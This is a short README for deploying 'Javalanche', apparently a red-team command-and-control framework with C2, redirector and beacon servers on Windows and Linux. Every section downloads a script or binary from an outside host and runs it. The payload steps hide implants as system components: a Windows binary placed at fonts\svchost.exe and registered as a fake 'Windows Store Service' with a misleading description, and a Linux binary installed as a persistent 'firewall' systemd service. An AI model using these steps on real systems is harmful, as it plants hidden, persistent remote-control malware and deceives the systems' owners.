To The following file contains documentation to manually deploy the agent, proxy server, or C2 server on both Windows and Linux.

Linux Redirect Server

$ sudo apt update
$ sudo apt upgrade -y
$ sudo apt install curl -y
$ sudo curl -o serverSetup.sh https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Setup/redirectServerSetup.sh?ref_type=heads
$ sudo chmod +x serverSetup.sh
$ sudo ./serverSetup.sh


Linux C2 Server

$ sudo apt update
$ sudo apt upgrade -y
$ sudo apt install curl tmux -y
$ sudo mkdir /home/javalanche
$ cd /home/javalanche
$ sudo curl -o serverSetup.sh http://javalanche.net/linuxServerSetup
$ sudo chmod +x serverSetup.sh
$ tmux new -s c2
$ sudo ./serverSetup.sh


Linux Long Range Beacon Server

$ sudo apt update
$ sudo apt install curl tmux -y
$ sudo mkdir /home/javalanche
$ cd /home/javalanche
$ sudo curl -o serverSetup.sh http://javalanche.net/linuxServerSetup
$ sudo chmod +x serverSetup.sh
$ tmux new -s c2
$ sudo ./serverSetup.sh -server Beacon


Windows Payload

ps> wget -o C:\\Windows\fonts\svchost.exe http://javalanche.net/windowsPayload
ps> New-Service -name 'Windows Store Service' -BinaryPathName 'C:\\Windows\\fonts\\svchost.exe' -DisplayName 'Windows Store Service' -Description 'This Service Assists the Windows Store. If this service is stopped, many core windows features will not work correctly' -Startuptype Automatic
ps> Start-Service -name 'Windows Store Service'


Linux Payload

$ sudo apt update
$ sudo apt install curl -y
$ sudo curl -o /bin/firewall "http://javalanche.net/linuxPayload"
$ sudo chmod +x /bin/firewall
$ sudo curl -o /lib/systemd/system/firewall.service "http://javalanche.net/linuxServiceFile"
$ sudo chmod 644 /lib/systemd/system/firewall.service
$ systemctl daemon-reload
$ sudo systemctl enable firewall
$ sudo systemctl start firewall


Windows C2 Server

ps> wget -o setup.ps1 "http://javalanche.net/windowsServerSetup"
ps> .\setup.ps1


Windows Long Range Beacon Server

ps> wget -o setup.ps1 "http://javalanche.net/windowsServerSetup"
ps> .\setup.ps1 -server Beacon
